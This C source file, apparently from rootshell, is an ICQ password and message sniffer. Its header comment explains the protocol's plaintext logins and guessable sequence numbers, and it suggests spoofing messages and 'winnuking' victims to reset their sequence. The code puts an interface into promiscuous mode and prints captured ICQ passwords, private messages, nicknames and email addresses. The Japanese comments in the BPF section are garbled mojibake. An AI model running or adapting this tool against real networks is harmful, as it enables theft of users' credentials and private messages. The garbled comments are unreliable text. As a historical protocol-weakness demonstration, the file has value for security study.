/*

[ http://www.rootshell.com/ ]

This is a little toy to demo the weaknesses in Mirabilis ICQ system. There
are two major problems with the ICQ protocol clearly visible. As its an
unpublished proprietary system we can assume there may well be far more
lurking. Its also too apparent why they dont publish it - my guess has to
be "embarrasment factor"

The first flaw is plain dumb. They send plaintext authentication. Not only
that they send it once per session.

The second flaw is that they use easily guessable sequence numbers - starting
from 0 each user session, they use UDP and to make life even easier their
query service will tell you exactly what IP address to spoof as source when
faking them. So you can find someone is on, find their IP and spoof sequences
0->100 with a fair bet that somewhere before the 100th fake message you'll
get several hits and spoof messages. If not you can winnuke the victim so
he'll be back on a low sequence number 8)

Let us hope the proposed Rendezvous Protocol that is supposed to become
an internet draft is better designed and that the ICQ people switch to it.
There really is no excuse for using crude plaintext and simplistic sequence
spaces when five minutes thought could have resolved almost every weakness
except password change without US export controlled crypto.

I've enclosed a demo that does password sniffing for ICQ. It requires you
can work out how to set it up and it doesnt including spoofing code.

Alan

*/

/*
 *      Snoop ICQ traffic for a set host. Shows how simplistic ICQ is and
 *      how easy it is to snoop it.
 */

#ifdef __FreeBSD__
typedef unsigned int u_int;
typedef unsigned long u_long;
typedef unsigned long int n_long;
typedef unsigned short u_short;
typedef unsigned char u_char;
#endif

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <ctype.h>
#include <sys/socket.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
//#include <linux/ip.h>
//#include <linux/udp.h>

#define __FAVOR_BSD
/* use bsd'ish udp header */
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <netdb.h>
#ifndef __linux 
#include <sys/ioctl.h>
#include <net/bpf.h>
#include <net/if.h>
#include <fcntl.h>

#define MAXSIZE 8192  
#define CMAX    256  
#define OPTNUM  9  
#define ON      1  
#define OFF     0  
#define DEF_IF  "en0"   /* Mac OS X�̃f�t�H���g�C���^�t�F�[�X�� */  
#else
#include <netinet/ether.h>
#endif

#ifndef __linux  
int open_bpf(char *ifname, int *bufsize);  
#endif  

/*
 *      PUT THE IP ADDRESS OF THE CLIENT TO SNOOP HERE OR IT WONT WORK
 */

#define MY_CLIENT_TO_WATCH      0x7F000001

static int create_socket(void)
{
	int s;                   /* �\�P�b�g�f�B�X�N���v�^    */  

#ifndef __linux  
	char ifname[CMAX] = "";  /* �C���^�t�F�[�X��          */  
	struct bpf_hdr *bp;      	/* BPF�w�b�_�\����           */  
	int bpf_len;             	/* BPF�ł̎�M�f�[�^�̒���   */  
	int bufsize;             		/* BPF���̃o�b�t�@�T�C�Y   */  

	if (strcmp(ifname, "") == 0)  
		strcpy(ifname, DEF_IF);  
  
	if ((s = open_bpf(ifname, &bufsize)) < 0)  
		exit(EXIT_FAILURE);  
	bpf_len = 0;  
#else
        s=socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
        if(s==-1)
        {
                perror("socket");
                exit(1);
        }
#endif
        return s;
}

static void close_socket(int s)
{
        close(s);
}

static void promiscuous(int s, char *iface, int onoff)
{
        struct ifreq ifr;
        strcpy(ifr.ifr_name, iface);

        if(ioctl(s, SIOCGIFFLAGS, &ifr)==-1)
        {
                perror("SIOCGIFFLAGS");
                exit(1);
        }

        strcpy(ifr.ifr_name, iface);
        if(onoff)
                ifr.ifr_flags|=IFF_PROMISC;
        else
                ifr.ifr_flags&=~IFF_PROMISC;
        if(ioctl(s, SIOCSIFFLAGS, &ifr)==-1)
        {
                perror("SIOCSIFFLAGS");
                exit(1);
        }
}

static __inline__ ip_p(unsigned char *packet, int len)
{
        if(packet[12]==0x08 && packet[13]==0x00)
                return 1;
        return 0;
}

struct icqhdr
{
        unsigned char version[2] __attribute((packed)); /* ?? */
        unsigned short command __attribute((packed));
        unsigned short sequence __attribute((packed));
        unsigned long uid __attribute((packed));
        unsigned char data[0];
};

struct icqack
{
        unsigned char version[2] __attribute((packed)); /* ?? */
        unsigned short result __attribute((packed));
        unsigned short sequence __attribute((packed));
        unsigned char data[0];
};

struct icqstring
{
        unsigned short len;
        char data[0];
};

struct icqlogin
{
        struct icqhdr hdr __attribute((packed));
        unsigned long dunno __attribute((packed)); /* 000006FE.L */
        unsigned short pw_len __attribute((packed));
        unsigned char pw_data[11] __attribute((packed));
        struct in_addr addr __attribute((packed));
        /* Rest is a mystery right now */
        /* 0.L */
        /* 2.L */
        /* 0000004C, 00000000 */
        /* 00 78 */
};

static void print_icq_string(struct icqstring *s)
{
        fwrite(s->data, s->len-1, 1, stdout);
}

/*
 *      Scan a packet for clues
 */

static int process_packet(struct sockaddr *sa, unsigned char *packet, int len)
{
        int i;
        int lv;
        int d=0;
        static long num=0;
        struct ip *iph;
        struct udphdr *udp;
        if(strcmp(sa->sa_data,"eth0"))
                return 0;               /* Wrong port */
        if(!ip_p(packet, len))
                return 0;

        iph=(struct ip *)(packet+14);
        udp=(struct udphdr *)(iph+1);
        /* assume no options */

        lv=ntohs(udp->uh_ulen);

        if( udp->uh_sport !=htons(4000) && udp->uh_dport!=htons(4000))
        {
                return 0;
        }

/*      printf("packet %d   \r", ++num);*/

        if(iph->ip_src.s_addr == htonl(MY_CLIENT_TO_WATCH))
        {
                printf("To Server: %d bytes\n", lv);
        }
        else if(iph->ip_dst.s_addr == htonl(MY_CLIENT_TO_WATCH))
        {
                printf("From Server: %d bytes\n", lv);
                d=1;
        }
        else return 0;

        i=14+sizeof(struct ip);
        if(len-i>lv)
                len=i+lv;

        i+=sizeof(struct udphdr);

/*      printf("UDP size %d\n",i);*/
        if(i>=sizeof(struct icqhdr)+sizeof(struct udphdr))
        {
                struct icqhdr *p=(struct icqhdr *)(udp+1);
                if(d==0)
                {
                        printf("From %ld\n",p->uid);
                        printf("Version: %d.%d\nCommand ",
                                p->version[1], p->version[0]);
                        switch(p->command)
                        {
                                case 0x000A:
                                        printf("Ack");
                                        break;
                                case 0x03E8:
                                {
                                        struct icqlogin *il=(struct icqlogin *)p;
                                        printf("Login Password ");
                                        print_icq_string((struct icqstring *)&il->pw_len);
                                        printf(" IP %s", inet_ntoa(il->addr));
                                        break;
                                }
#if 0
                                case 0x0x??
                                {
                                        struct in_addr v=*(struct in_addr *)p->data;
                                        printf("Ping %s", inet_ntoa(v));
                                        break;
                                }
#endif
                                case 0x409:
                                {
                                        printf("Ping");
                                        break;
                                }
                                case 0x0438:
                                {
                                        struct icqstring *s=(struct icqstring *)p->data;
                                        printf("Disconnect (");
                                        print_icq_string(s);
                                        printf(")");
                                        break;
                                }
                                case 0x0456:
                                {
                                        /* data +4,5 is always 0100 */
                                        struct icqstring *s=(struct icqstring *)(p->data+6);
                                        printf("Message to %ld  ", *((long *)p->data));
                                        print_icq_string(s);
                                        break;
                                }
                                case 0x0460:
                                {
                                        printf("Information %ld on ID %d",
                                                *((short *)p->data),
                                                *((long *)(p->data+2))
                                        );
                                        break;
                                }
                                case 0x046A:
                                {
                                        printf("Information_2 %ld on ID %d",
                                                *((short *)p->data),
                                                *((long *)(p->data+2))
                                        );
                                        break;
                                }
                                case 0x04D8:
                                {
                                        printf("Status ");
                                        switch(*((long *)p->data))
                                        {
                                                case 0x00:
                                                        printf("[Away 0]");
                                                        break;
                                                case 0x01:
                                                        printf("[Away 1]");
                                                        break;
                                                case 0x10:
                                                        printf("[DND 0]");
                                                        break;
                                                case 0x11:
                                                        printf("[DND 1]");
                                                        break;
                                                default:
                                                        printf("%04X",
                                                                *((long *)p->data));
                                        }

                                        break;
                                }
                                default:
                                        printf("%04X", p->command);
                        }
                        if(p->sequence)
                                printf("\nSequence %d\n",
                                        p->sequence);
                        else
                                printf("\n");
                }
        }
        if(i>=sizeof(struct icqack)+sizeof(struct udphdr))
        {
                struct icqack *p=(struct icqack *)(udp+1);
                if(d==1)
                {
                        printf("Version: %d.%d\nReply ",
                                p->version[1], p->version[0]);
                        switch(p->result)
                        {
                                case 0x000A:
                                        printf("Ack");
                                        break;

                                case 0x00E6:
                                        printf("Away Reply ");
                                        printf("for %ld",
                                                *((long *)p->data));
                                        break;

                                case 0x0118:
                                {
                                        struct icqstring *is;
                                        printf("InfoID %d\n",
                                                *((short *)p->data));
                                        printf("ICQ ID %ld\n",
                                                *((long *)p->data+2));
                                        is=(struct icqstring *)(p->data+6);
                                        printf("Nick ");
                                        print_icq_string(is);
                                        is=(struct icqstring *)(((char *)is)+is->len+2);
                                        printf("\nName ");
                                        print_icq_string(is);
                                        is=(struct icqstring *)(((char *)is)+is->len+2);
                                        printf(" ");
                                        print_icq_string(is);
                                        is=(struct icqstring *)(((char *)is)+is->len+2);
                                        printf("\nEMail ");
                                        print_icq_string(is);
                                        is=(struct icqstring *)(((char *)is)+is->len+2);
                                        printf("\nInfo ");
                                        print_icq_string(is);
                                        break;
                                }
                                default:
                                        printf("%04X", p->result);
                        }
                        if(p->sequence)
                                printf("\nSequence %d\n",
                                        p->sequence);
                        else
                                printf("\n");
                }
        }

        while(i<len)
        {
                int x;
                for(x=0; x<8 && i+x<len; x++)
                {
                        printf("%02X ", packet[i+x]);
                }
                printf("    ");
                for(x=0;x<8 && i+x<len; x++)
                {
                        unsigned char c=packet[i+x];
                        if(c>=32 && c< 127)
                                printf("%c", c);
                        else
                                printf(".");
                }
                printf("\n");
                i+=8;
        }
        printf("\n");
        fflush(stdout);
        return 0;
}

int main(int argc, char *argv[])
{
        int s;
        unsigned char buf[1600];
        struct sockaddr sa;
        int salen;
        int len;

        s=create_socket();
        promiscuous(s, "eth0", 1);

        while(1)
        {
                salen=sizeof(sa);
                if((len=recvfrom(s, (char *)buf, 1600, 0, &sa, &salen))==-1)
                {
                        perror("recvfrom");
                        close_socket(s);
                        exit(1);
                }
                process_packet(&sa, buf,len);
        }
        printf("An error has occured.\n");
        close_socket(s);
        exit(0);
}

#ifndef __linux  
/* 
 * int open_bpf(char *ifname, int *bufsize); 
 * �@�\ 
 *     BPF��I�[�v������ 
 * �� 
 *     char *ifname;  �C���^�t�F�[�X�� 
 *     int *bufsize;  BPF���̃o�b�t�@�T�C�Y 
 * �߂�l 
 *     int            �t�@�C���f�B�X�N���v�^ 
 */  
int open_bpf(char *ifname, int *bufsize)  
{  
  char buf[CMAX];    /* ������i�[�p              */  
  int bpfd;          /* �t�@�C���f�B�X�N���v�^    */  
  struct ifreq ifr;  /* �C���^�t�F�[�X�����\����  */  
  int i;             /* ���[�v�ϐ�                */  
  
  /* BPF�f�o�C�X�t�@�C���̃I�[�v�� */  
  for (i = 0; i < 4; i++) {   
    snprintf(buf, CMAX, "/dev/bpf%d", i);  
    if ((bpfd = open(buf, O_RDWR, 0)) > 0)  
      break;  
  }  
  
  if (i >= 5) {  
    fprintf(stderr, "cannot open BPF\n");  
    return -1;  
  }  
  
  /* BPF���̃o�b�t�@�T�C�Y�̐ݒ� */  
  *bufsize = MAXSIZE;  
  if (ioctl(bpfd, BIOCSBLEN, bufsize) < 0) {  
    snprintf(buf, CMAX, "ioctl(BIOCSBLEN, %d)", *bufsize);  
    perror(buf);  
    return -1;  
  }  
  
  /* �C���^�t�F�[�X���̐ݒ� */  
  snprintf(ifr.ifr_name, CMAX, "%s", ifname);  
  if (ioctl(bpfd, BIOCSETIF, &ifr) < 0) {  
    snprintf(buf, CMAX, "ioctl(BIOCSETIF, '%s')", ifname);  
    perror(buf);  
    return -1;  
  }  
  fprintf(stderr, "BPF read from '%s' (%s)\n", ifr.ifr_name, buf);  
  
  /* promiscuous���[�h */  
  if (ioctl(bpfd, BIOCPROMISC, NULL) < 0) {  
    perror("ioctl(BIOCPROMISC)");  
    return -1;  
  }  
  
  /* �������[�h */  
  i = 1;  
  if (ioctl(bpfd, BIOCIMMEDIATE, &i) < 0) {  
    perror("ioctl(BIOCIMMEDIATE)");  
    return -1;  
  }  
  
  return bpfd;  
}  
#endif  

